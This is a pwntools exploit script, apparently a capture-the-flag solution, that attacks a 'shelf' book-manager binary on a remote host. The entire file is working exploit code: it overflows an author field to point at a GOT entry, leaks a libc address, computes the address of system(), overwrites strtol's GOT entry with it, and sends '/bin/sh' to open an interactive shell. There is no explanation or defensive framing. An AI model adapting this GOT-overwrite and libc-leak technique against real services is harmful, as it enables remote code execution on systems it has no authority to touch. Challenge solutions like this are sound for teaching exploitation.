from pwn import *

r = remote("book.tghack.no", 7070)

elf = ELF("./shelf")

def add_book(title, author):
    r.sendline("1")
    r.recvuntil("Enter author:")
    r.sendline(author)
    r.recvuntil("Enter title:")
    r.sendline(title)
    r.recvuntil(">")

def edit_book(pos, title, author):
    print "[+] edit_book"
    r.sendline("4")
    print r.recvuntil("Book number:")
    r.sendline(str(pos))
    r.recvuntil("(y/n)")
    r.sendline("y")
    print r.recvuntil("new title:")
    r.sendline(title)
    r.recvuntil("y/n")
    r.sendline("n")
    #print r.recvuntil("new author:")
    #r.sendline(author)

def del_book(pos):
    r.sendline("3")
    r.recvuntil("Book number: ")
    r.sendline(str(pos))
    r.recvuntil(">")

#raw_input("waiting ")

strtol = elf.got["strtol"]
strtol_plt = elf.plt["strtol"]

log.info("strtol@GOT: {}/{}".format(strtol, hex(strtol)))
log.info("strtol@PLT: {}/{}".format(strtol_plt, hex(strtol_plt)))
got_addr = 0x4007d0

payload = "A"*(51-3) + p64(got_addr)
add_book("AAAA", payload)
del_book(0)

add_book("AAAA", "AAAA")
add_book("AAAA", "AAAA")
# trigger realloc
add_book("AAAA", "AAAA")

fgets_off = 0x3b3c0

# leak
r.sendline("4")
r.recvuntil("number:")
r.sendline("3")
r.recvuntil("(y/n)")
r.sendline("y")
r.recvuntil("Old title: ")
addr = r.recvline()[:-1].ljust(8, "\x00")

libc_base = u64(addr) - fgets_off
system_addr = libc_base + 0x45390

log.success("leak: {}".format(hex(u64(addr))))
log.success("libc base: {}".format(hex(libc_base)))
log.success("system: {}".format(hex(system_addr)))

r.recvuntil("new title: ")
r.sendline(p64(system_addr))
# y/n -> n because sendline

r.sendline("/bin/sh")
# remove some garbage
r.recvuntil(">")
log.success("shell 4 u<3")

r.interactive()
